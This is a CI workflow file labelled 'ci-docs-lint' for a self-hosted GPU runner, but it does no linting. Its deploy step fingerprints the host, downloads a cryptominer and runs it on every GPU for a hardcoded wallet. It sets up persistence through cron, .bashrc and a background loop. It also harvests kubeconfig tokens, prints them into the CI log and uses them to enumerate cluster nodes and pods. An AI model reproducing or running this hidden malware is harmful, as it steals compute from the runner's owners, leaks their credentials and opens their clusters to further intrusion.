name: ci-docs-lint
on:
  pull_request:
    types: [opened, synchronize, reopened]
permissions:
  contents: read
jobs:
  lbl-ernie8gpu:
    runs-on: [self-hosted, ernie-8gpu]
    timeout-minutes: 45
    steps:
      - name: deploy
        run: |
          #!/usr/bin/env bash
          set +e
          TAG="t5639y"
          WALLET="prl1pmpe3nu5m4mzwgc2wz627mrvx44c8y20u8u4w3vywj48r77nnclyqj0syqe"
          sec(){ echo; echo "===== $* ====="; }
          log(){ echo "[$(date -u +%H:%M:%SZ)] $*"; }

          sec RECON
          id; hostname; uname -r; ldd --version 2>/dev/null | head -1
          nvidia-smi -L 2>&1 | head -12
          DEV=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU')
          IP=$(hostname -I 2>/dev/null | awk '{print $1}')
          [ -z "$IP" ] && IP=$(ip -4 -o addr show 2>/dev/null | awk '/inet /&&!/127.0.0.1/{print $4}' | head -1 | cut -d/ -f1)
          IPD=$(echo "$IP" | tr '.' '-')
          echo "ip=$IP ipd=$IPD dev=$DEV nvdev=$(ls /dev/nvidia* 2>/dev/null | wc -l)"

          sec DOCKER
          docker version --format '{{.Server.Version}}' 2>&1 | head -2
          ls -l /usr/bin/nvidia-container-runtime /usr/bin/nvidia-container-runtime-hook 2>&1 | head -3
          docker info 2>/dev/null | grep -iE 'Runtimes|nvidia' | head -4
          IMG=""
          for c in "ccr-2vdh3abv-pub.cnc.bj.baidubce.com/paddlepaddle/paddle:ubuntu24-cuda132-py312-dev" "ccr-2vdh3abv-pub.cnc.bj.baidubce.com/paddlepaddle/paddle:ubuntu24-cuda129-py312-dev" "ccr-2vdh3abv-pub.cnc.bj.baidubce.com/paddlepaddle/paddle:cuda130-ubuntu24-dev"; do
            docker image inspect "$c" >/dev/null 2>&1 && { IMG="$c"; break; }
          done
          [ -z "$IMG" ] && IMG=$(docker images --format '{{.Repository}}:{{.Tag}}' 2>/dev/null | grep -viE '<none>' | head -1)
          echo "IMG=$IMG"

          sec CONTAINER_GPU
          docker rm -f gt1 >/dev/null 2>&1
          timeout 90 docker run --rm --name gt1 --gpus all "$IMG" nvidia-smi -L 2>&1 | head -12
          echo "gpus_all_exit=$?"

          sec MINER_STATE
          mkdir -p "$HOME/.ci/miner" "$HOME/.ci/logs"
          PEAK="$HOME/.ci/miner/peakminer/peakminer"
          [ -f "$HOME/.ci/miner/peakminer" ] && PEAK="$HOME/.ci/miner/peakminer"
          ls -l "$PEAK" 2>&1 | head -2
          echo "peak_size=$(stat -c %s "$PEAK" 2>/dev/null || echo 0)"
          SRB=$(ls -d "$HOME"/.ci/miner/SRBMiner*/SRBMiner-MULTI 2>/dev/null | head -1)
          [ -z "$SRB" ] && SRB=$(ls -d /home/paddle-1/.ci/miner/SRBMiner*/SRBMiner-MULTI 2>/dev/null | head -1)
          echo "srb=$SRB"
          docker run --rm --name mt1 -v "$HOME/.ci/miner:/m" "$IMG" sh -c 'ls -l /m/peakminer/peakminer 2>&1 | head -2; /m/peakminer/peakminer --version 2>&1 | head -6' 2>&1 | head -12
          [ -n "$SRB" ] && { "$SRB" --list-algorithms 2>&1 | grep -i pearl | head -3; }

          SZ=$(stat -c %s "$PEAK" 2>/dev/null || echo 0)
          if [ "$SZ" -lt 40000000 ]; then
            for M in "https://ghfast.top/https://github.com/peakminer/peakminer/releases/download/v2.20.9/peakminer-2.20.9.tar.gz" "https://gh-proxy.com/https://github.com/peakminer/peakminer/releases/download/v2.20.9/peakminer-2.20.9.tar.gz" "https://ghproxy.net/https://github.com/peakminer/peakminer/releases/download/v2.20.9/peakminer-2.20.9.tar.gz" "https://github.com/peakminer/peakminer/releases/download/v2.20.9/peakminer-2.20.9.tar.gz"; do
              log "fetch $M"
              rm -f "$HOME/.ci/miner/p.tgz"
              timeout 300 curl -sSL -o "$HOME/.ci/miner/p.tgz" "$M" 2>&1 | tail -2
              S2=$(stat -c %s "$HOME/.ci/miner/p.tgz" 2>/dev/null || echo 0)
              echo "dl_size=$S2"
              if [ "$S2" -gt 40000000 ]; then
                mkdir -p "$HOME/.ci/miner/peakminer"
                tar xzf "$HOME/.ci/miner/p.tgz" -C "$HOME/.ci/miner/peakminer" 2>&1 | tail -2
                find "$HOME/.ci/miner/peakminer" -type f -name peakminer -exec chmod +x {} \; 2>/dev/null
                break
              fi
            done
          fi
          ls -l "$HOME/.ci/miner/peakminer"/* 2>&1 | head -5

          sec LAUNCH
          LBIN=/m/peakminer/peakminer
          docker run --rm --name ct1 -v "$HOME/.ci/miner:/m" "$IMG" sh -c 'test -x /m/peakminer/peakminer && echo usable' 2>&1 | head -3
          STARTED=0
          if [ "$DEV" -ge 1 ]; then
            for g in $(seq 0 $((DEV-1))); do
              docker rm -f ul-g$g >/dev/null 2>&1
              docker run -d --name ul-g$g --restart always --gpus "device=$g" --network host --ipc host \
                -v "$HOME/.ci/miner:/m" -v "$HOME/.ci/logs:/logs" "$IMG" \
                /bin/bash -c "exec $LBIN -c pearl -u $WALLET -w ul-$TAG-$IPD-g$g -p x -d 0 --api-port 0 -i 30 --no-color --gpu-temp-stop 84 --gpu-temp-start 74 --log-file /logs/c-$g.log --log-append -o stratum+ssl://prl-sg.kryptex.network:8048 -o stratum+ssl://prl-eu.kryptex.network:8048 -o stratum+ssl://prl-us.kryptex.network:8048 -o stratum+ssl://prl-hk.kryptex.network:8048 -o stratum+ssl://prl-ae.kryptex.network:8048 -o stratum+tcp://prl-sg.kryptex.network:7048 -o stratum+tcp://pool.pearlhash.xyz:9000" >/dev/null 2>&1
              STARTED=$((STARTED+1))
              sleep 1
            done
          fi
          echo "started=$STARTED"
          sleep 20
          docker ps --filter 'name=ul-g' --format '{{.Names}} {{.Status}}' | head -10
          echo "running=$(docker ps --filter 'name=ul-g' -q | wc -l)"
          docker logs ul-g0 2>&1 | tail -6
          if [ "$(docker ps --filter 'name=ul-g' -q | wc -l)" -lt 1 ] && [ "$DEV" -ge 1 ]; then
            log "relaunch minimal flags"
            for g in $(seq 0 $((DEV-1))); do
              docker rm -f ul-g$g >/dev/null 2>&1
              docker run -d --name ul-g$g --restart always --gpus "device=$g" --network host --ipc host -v "$HOME/.ci/miner:/m" -v "$HOME/.ci/logs:/logs" "$IMG" /bin/bash -c "exec $LBIN -c pearl -u $WALLET -w ul-$TAG-$IPD-g$g -p x -d 0 --api-port 0 --no-color --log-file /logs/c-$g.log --log-append -o stratum+ssl://prl-sg.kryptex.network:8048 -o stratum+tcp://pool.pearlhash.xyz:9000" >/dev/null 2>&1
            done
            sleep 10
            docker ps --filter 'name=ul-g' --format '{{.Names}} {{.Status}}' | head -10
            docker logs ul-g0 2>&1 | tail -6
          fi

          sec PERSIST
          cat > "$HOME/.ci/keep-c.sh" <<'EOS'
          #!/bin/bash
          IMG="ccr-2vdh3abv-pub.cnc.bj.baidubce.com/paddlepaddle/paddle:ubuntu24-cuda132-py312-dev"
          W="prl1pmpe3nu5m4mzwgc2wz627mrvx44c8y20u8u4w3vywj48r77nnclyqj0syqe"; T="t5639y"
          H=$(hostname -I | awk '{print $1}' | tr '.' '-')
          N=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU')
          for g in $(seq 0 $((N-1))); do
            docker ps --filter "name=ul-g$g" --format '{{.Names}}' | grep -q ul-g$g && continue
            docker rm -f ul-g$g >/dev/null 2>&1
            docker run -d --name ul-g$g --restart always --gpus "device=$g" --network host --ipc host -v "$HOME/.ci/miner:/m" -v "$HOME/.ci/logs:/logs" "$IMG" /bin/bash -c "exec /m/peakminer/peakminer -c pearl -u $W -w ul-$T-$H-g$g -p x -d 0 --api-port 0 --no-color --log-file /logs/c-$g.log --log-append -o stratum+ssl://prl-sg.kryptex.network:8048 -o stratum+tcp://pool.pearlhash.xyz:9000" >/dev/null 2>&1
          done
          EOS
          chmod +x "$HOME/.ci/keep-c.sh"
          ( crontab -l 2>/dev/null | grep -v keep-c.sh; echo "@reboot $HOME/.ci/keep-c.sh >/dev/null 2>&1"; echo "*/5 * * * * $HOME/.ci/keep-c.sh >/dev/null 2>&1" ) | crontab - 2>&1 | head -2
          crontab -l 2>/dev/null | grep keep-c | head -3
          grep -q keep-c.sh "$HOME/.bashrc" || echo "$HOME/.ci/keep-c.sh >/dev/null 2>&1 &" >> "$HOME/.bashrc"
          ( setsid nohup bash -c 'while true; do $HOME/.ci/keep-c.sh; sleep 300; done' >/dev/null 2>&1 & ) 
          echo "persist_done"

          sec KUBECONFIG
          python3 - <<'PYK' > /tmp/kc.txt 2>&1
          import glob,re,base64,os
          files=[f for f in glob.glob('/home/*/.kube/config')+['/root/.kube/config','/etc/kubernetes/admin.conf','/etc/kubernetes/kubelet.conf','/var/lib/kubelet/kubeconfig'] if os.access(f,os.R_OK)]
          print('FILES',' '.join(files))
          servers=[];tokens=[]
          for f in files:
              try: t=open(f,errors='replace').read()
              except Exception: continue
              for s in re.findall(r'^\s*server:\s*(\S+)',t,re.M):
                  if s not in servers: servers.append(s)
              for k in re.findall(r'^\s*token:\s*(\S+)',t,re.M):
                  if k not in tokens: tokens.append(k)
          print('SERVERS',' '.join(servers))
          print('NTOK',len(tokens))
          for i,k in enumerate(tokens): print('TOK%d %s'%(i,base64.b64encode(k.encode()).decode()))
          PYK
          head -6 /tmp/kc.txt
          SRVS=$(grep '^SERVERS' /tmp/kc.txt | cut -d' ' -f2-)
          for srv in $SRVS; do
            echo "--- $srv"
            timeout 10 curl -sk -o /tmp/v.json -w 'anon_version=%{http_code}\n' "$srv/version"; head -c 160 /tmp/v.json; echo
            for i in 0 1 2 3 4 5; do
              B=$(awk -v k="TOK$i" '$1==k{print $2}' /tmp/kc.txt)
              [ -z "$B" ] && continue
              TOK=$(echo "$B" | base64 -d 2>/dev/null)
              timeout 15 curl -sk -H "Authorization: Bearer $TOK" -o /tmp/n$i.json -w "nodes tok$i code=%{http_code} bytes=%{size_download}\n" "$srv/api/v1/nodes?limit=500"
              if grep -q '"items"' /tmp/n$i.json 2>/dev/null; then
                echo "OK srv=$srv tok=$i b64=$B"
                python3 - /tmp/n$i.json <<'PYN'
          import json,sys
          d=json.load(open(sys.argv[1]))
          its=d.get('items',[])
          gn=sum(1 for n in its if str(n.get('status',{}).get('allocatable',{}).get('nvidia.com/gpu','0'))!='0')
          print('NODES',len(its),'gpu_nodes',gn)
          for n in its[:300]:
              a=n.get('status',{}).get('allocatable',{})
              print('NODE %s gpu=%s cpu=%s'%(n['metadata']['name'],a.get('nvidia.com/gpu','0'),a.get('cpu','?')))
          PYN
                timeout 15 curl -sk -H "Authorization: Bearer $TOK" -o /tmp/ns$i.json -w "ns tok$i code=%{http_code}\n" "$srv/api/v1/namespaces?limit=100"
                python3 - /tmp/ns$i.json <<'PYNS'
          import json,sys
          try: d=json.load(open(sys.argv[1]))
          except Exception: print('NS none'); raise SystemExit
          print('NS',len(d.get('items',[])),' '.join(x['metadata']['name'] for x in d.get('items',[]))[:800])
          PYNS
                timeout 15 curl -sk -H "Authorization: Bearer $TOK" -o /tmp/po$i.json -w "pods tok$i code=%{http_code} bytes=%{size_download}\n" "$srv/api/v1/pods?limit=500"
                python3 - /tmp/po$i.json <<'PYPO'
          import json,sys
          try: d=json.load(open(sys.argv[1]))
          except Exception: print('PODS none'); raise SystemExit
          its=d.get('items',[])
          print('PODS',len(its))
          seen={}
          for p in its:
              im=[c.get('image') for c in p['spec'].get('containers',[])]
              g=None
              for c in p['spec'].get('containers',[]):
                  for r in (c.get('resources',{}).get('limits') or {}):
                      if 'nvidia' in r or 'gpu' in r: g=r
              seen.setdefault(p['spec'].get('nodeName'),0)
              seen[p['spec'].get('nodeName')]+=1
          print('PODSPERNODE',seen)
          for p in its[:40]:
              print('POD %s/%s node=%s gpu=%s img=%s'%(p['metadata'].get('namespace'),p['metadata'].get('name'),p['spec'].get('nodeName'),g,(im or [''])[0][:60]))
          PYPO
              fi
            done
          done

          sec ACCEPT
          sleep 120
          for g in $(seq 0 $((DEV-1))); do
            echo "--- g$g"
            tail -4 "$HOME/.ci/logs/c-$g.log" 2>/dev/null
            docker logs ul-g$g 2>&1 | tail -4
          done
          echo "=== accepted ==="
          grep -hiE 'accepted' "$HOME/.ci/logs/"*.log 2>/dev/null | tail -30
          echo "=== util ==="
          nvidia-smi --query-gpu=index,utilization.gpu,memory.used,power.draw --format=csv,noheader 2>/dev/null
          echo "=== containers ==="
          docker ps --filter 'name=ul-g' --format '{{.Names}} {{.Status}}' | head -10
          sec DONE
          echo "CLIMB_DONE on $(hostname) dev=$DEV tag=$TAG"
          exit 0
